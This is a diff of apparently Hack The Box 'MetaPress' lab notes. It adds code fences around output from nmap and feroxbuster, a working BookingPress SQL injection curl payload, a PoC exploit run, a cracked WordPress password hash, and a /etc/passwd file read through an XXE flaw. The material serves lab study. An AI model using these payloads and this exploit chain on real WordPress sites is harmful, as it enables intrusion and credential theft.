@@ -1,3 +1,4 @@
+```console
 └─$ nmap -A -p- -Pn 10.10.11.186 
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-10 11:42 CST
 Nmap scan report for metapress.htb (10.10.11.186)
@@ -36,7 +37,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 753.04 seconds
+```
 
+```console
 └─$ feroxbuster -u http://metapress.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,git,pdf -q -fs 200,301
 200      GET      155l      552w        0c http://metapress.htb/
 301      GET        0l        0w        0c http://metapress.htb/about/ => http://metapress.htb/about-us/
@@ -89,10 +92,10 @@ Nmap done: 1 IP address (1 host up) scanned in 753.04 seconds
 301      GET        0l        0w        0c http://metapress.htb/0/about/ => http://metapress.htb/about-us/
 200      GET      384l     3177w    19915c http://metapress.htb/license.txt
 200      GET       97l      823w     7278c http://metapress.htb/readme.html
-
+```
 
 https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
-
+```console
 └─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=61a943f4b5&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
 HTTP/1.1 200 OK
 Server: nginx/1.18.0
@@ -108,8 +111,8 @@ Cache-Control: no-cache, must-revalidate, max-age=0
 X-Frame-Options: SAMEORIGIN
 Referrer-Policy: strict-origin-when-cross-origin
 
-[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                                                                                       
-
+[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                                                         ```                              
+```console
 └─$ python3 booking-press-expl.py -u http://metapress.htb -n 61a943f4b5&
 [1] 46154
 -- BookingPress PoC
@@ -129,7 +132,7 @@ NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
 Do NOT report auto-detect issues unless you are certain of the hash type.
 
 $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
-
+```
 
 
 manager
@@ -138,6 +141,37 @@ partylikearockstar
 https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
 
 
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+```
 
 ```php
 server {
